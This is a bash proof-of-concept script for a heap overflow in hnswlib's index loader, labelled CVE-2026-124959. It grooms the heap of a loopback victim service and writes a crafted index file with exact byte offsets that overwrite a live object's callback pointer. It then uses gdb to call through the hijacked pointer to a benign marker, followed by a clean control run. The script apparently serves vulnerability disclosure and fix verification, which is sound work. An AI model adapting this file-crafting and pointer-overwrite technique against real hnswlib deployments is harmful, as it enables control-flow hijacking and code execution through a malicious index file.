#!/usr/bin/env bash
# Heap-groomed live-neighbour observation for CVE-2026-124959.
# Builds a no-PIE, unsanitized loopback consumer whose tcache layout puts a
# LIVE CacheEntry directly after the level0 buffer the library mallocs at
# hnswalg.h:776. Freezes at hnswalg.h:781 after the library's own read at :779
# and checks file-chosen bytes in the live object's pointer field. Fixed side
# is the UNMERGED PR #677 head, never a released fix. Loopback only.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-/tmp/hnsw2-victim-out}
FRONTIER="$HERE/../frontier/hnswlib"
mkdir -p "$OUT"
cd "$FRONTIER/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

rm -rf "$OUT/v09"
mkdir -p "$OUT/v09"
tar -xzf "$FRONTIER/src/v0.9.0.tar.gz" -C "$OUT/v09" --strip-components=1 || exit 2

g++ -std=c++11 -O1 -g -I"$OUT/v09" "$FRONTIER/driver.cpp" -o "$OUT/gen" -pthread || exit 2
g++ -std=c++11 -O0 -g -no-pie -I"$OUT/v09" "$HERE/victim.cpp" \
  -o "$OUT/victim_gdb" -pthread || exit 2

"$OUT/gen" save "$OUT/hostile-5a.bin" 5a > "$OUT/gen.log" 2>&1 || exit 2
cp "$OUT/hostile-5a.bin" "$OUT/benign.bin"
python3 - "$OUT/benign.bin" <<'PY' || exit 2
import struct, sys
p = sys.argv[1]
with open(p, "r+b") as f:
    f.seek(8); f.write(struct.pack("<Q", 512))  # capacity fits: count 512
PY

# Probe run learns the live object's real chunk size field and placement from
# the service's own pre-write printf, rather than assuming a malloc size class.
P0=49871
"$OUT/victim_gdb" "$P0" "$OUT/probe-received.bin" > "$OUT/victim-probe.log" 2>&1 &
p=$!
sleep 1
python3 "$HERE/client.py" "$P0" "$OUT/hostile-5a.bin" > "$OUT/probe-client.log" 2>&1
wait "$p" 2>/dev/null
python3 - "$OUT/victim-probe.log" <<'PY' || exit 2
import re, sys
log = open(sys.argv[1]).read()
m = re.search(r"delta=(-?\d+) V_size_field=(0x[0-9a-f]+) callback_before=(0x[0-9a-f]+) top_size_before=(0x[0-9a-f]+)", log)
if not m:
    raise SystemExit("probe_groom_line_missing")
delta, size, cb0, topsize = int(m.group(1)), int(m.group(2), 16), int(m.group(3), 16), int(m.group(4), 16)
print("probe delta=%d V_size_field=%s callback_before=%s top_size_before=%s" % (
    delta, hex(size), hex(cb0), hex(topsize)))
if delta != 272:
    raise SystemExit("probe_delta_unexpected: expected 272")
open(sys.argv[1] + ".facts", "w").write("%d %d %d %d\n" % (delta, size, cb0, topsize))
PY
facts="$OUT/victim-probe.log.facts"
V_SIZE=$(python3 -c 'import sys;print(open(sys.argv[1]).read().split()[1])' "$facts")
CB0=$(python3 -c 'import sys;print(open(sys.argv[1]).read().split()[2])' "$facts")
TOPSIZE=$(python3 -c 'import sys;print(open(sys.argv[1]).read().split()[3])' "$facts")
MARKER=$(python3 - "$OUT/victim_gdb" <<'PY' || exit 2
import subprocess, sys
out = subprocess.check_output(["nm", "-an", sys.argv[1]], text=True)
addrs = [l.split()[0] for l in out.splitlines() if "benign_marker3" in l and l.split()]
if not addrs:
    raise SystemExit("marker3_symbol_missing")
print(hex(int(addrs[0], 16)))
PY
)
echo "learned V_size_field=$V_SIZE callback_before=$CB0 top_size_before=$TOPSIZE chosen_target=$MARKER"

# Craft the final index: keep V's and top's chunk headers valid so only live
# object fields change and the loader can be frozen after the copy at :781.
python3 - "$OUT" "$V_SIZE" "$TOPSIZE" "$MARKER" <<'PY' || exit 2
import struct, sys
out, vsize, topsize, marker = sys.argv[1], int(sys.argv[2], 0), int(sys.argv[3], 0), int(sys.argv[4], 0)
data = bytearray(open(out + "/hostile-5a.bin", "rb").read())
def put(off, val):
    data[off:off+8] = struct.pack("<Q", val)
put(352, 0)                       # dst+256 V prev_size (unused while allocated)
put(360, vsize)                   # dst+264 V size: preserve the live chunk
put(368, 0x1111111111111111)      # dst+272 V.magic  (chosen)
put(376, marker)                  # dst+280 V.callback (chosen = &benign_marker3)
put(384, 0x3333333333333333)      # dst+288 V.refcount (chosen)
data[392:424] = b"D" * 32         # dst+296 V.label (chosen)
put(424, topsize)                 # dst+328 top size: preserve allocator state
open(out + "/hostile-victim.bin", "wb").write(data)
print("crafted hostile-victim.bin")
PY
sha256sum "$OUT/hostile-victim.bin" > "$OUT/victim-index-sha256.txt"

# gdb freeze after the copy, then an optional call through the overwritten
# function pointer to a benign marker, all inside the service process.
PORT=49872
python3 - "$OUT" "$PORT" <<'PY' || exit 2
import sys
out, port = sys.argv[1], sys.argv[2]
script = """set pagination off
set confirm off
set print elements 16
break {out}/v09/hnswlib/hnswalg.h:779
run {port} {out}/gdb-received-victim.bin
printf "\\n==== BEFORE-COPY FREEZE AT PINNED hnswalg.h:779 ====\\n"
up 2
set $vv = V
set $gg = G
printf "G=%p V=%p delta=%ld callback_before=0x%lx\\n", $gg, $vv, (char *)$vv - (char *)$gg, $vv->callback
continue
printf "\\n==== POST-READ FREEZE (downstream allocator abort) ====\\n"
printf "V_size_field=0x%lx\\n", *(unsigned long *)((char *)$vv - 8)
printf "V.magic=0x%lx\\n", $vv->magic
printf "V.callback=0x%lx\\n", $vv->callback
printf "V.refcount=0x%lx\\n", $vv->refcount
printf "calling through the overwritten V.callback pointer...\\n"
call ((void (*)(void))$vv->callback)()
printf "\\n==== CALL THROUGH OVERWRITTEN POINTER RETURNED ====\\n"
quit
""".format(out=out, port=port)
open(out + "/freeze-victim.gdb", "w").write(script)
PY
gdb -q -batch -x "$OUT/freeze-victim.gdb" "$OUT/victim_gdb" \
  > "$OUT/gdb-victim.log" 2>&1 &
g=$!
sleep 1
python3 "$HERE/client.py" "$PORT" "$OUT/hostile-victim.bin" > "$OUT/victim-client.log" 2>&1
wait "$g" 2>/dev/null
echo "gdb_rc=$?"
cat "$OUT/victim-client.log" "$OUT/gdb-victim.log"
python3 - "$OUT/gdb-victim.log" "$MARKER" <<'PY' || exit 1
import sys
log = open(sys.argv[1]).read()
marker = int(sys.argv[2], 0)
need = [
    "POST-READ FREEZE (downstream allocator abort)",
    "V_size_field=",
    "V.magic=0x1111111111111111",
    "V.callback=0x%x" % marker,
    "V.refcount=0x3333333333333333",
    "BENIGN_MARKER3_EXECUTED",
]
missing = [n for n in need if n not in log]
if missing:
    raise SystemExit("victim_observation_missing: " + repr(missing))
print("VICTIM POINTER CONTROL OBSERVED rc 0")
PY

# Control: a capacity-fits index through the same socket and same grooming
# leaves the live object untouched and the load clean.
CPORT=49873
"$OUT/victim_gdb" "$CPORT" "$OUT/control-received.bin" > "$OUT/victim-control.log" 2>&1 &
q=$!
sleep 1
python3 "$HERE/client.py" "$CPORT" "$OUT/benign.bin" > "$OUT/control-client.log" 2>&1
wait "$q"
echo "control_rc=$?"
python3 - "$OUT/victim-control.log" "$CB0" <<'PY' || exit 1
import sys
log, cb0 = open(sys.argv[1]).read(), int(sys.argv[2], 0)
need = [
    "victim_load=loaded",
    "AFTER_LOAD magic=0x43414348454e5452 callback=0x%x refcount=0x1" % cb0,
]
missing = [n for n in need if n not in log]
if missing:
    raise SystemExit("control_mismatch: " + repr(missing))
print("CAPACITY_FITS_CONTROL_CLEAN rc 0")
PY
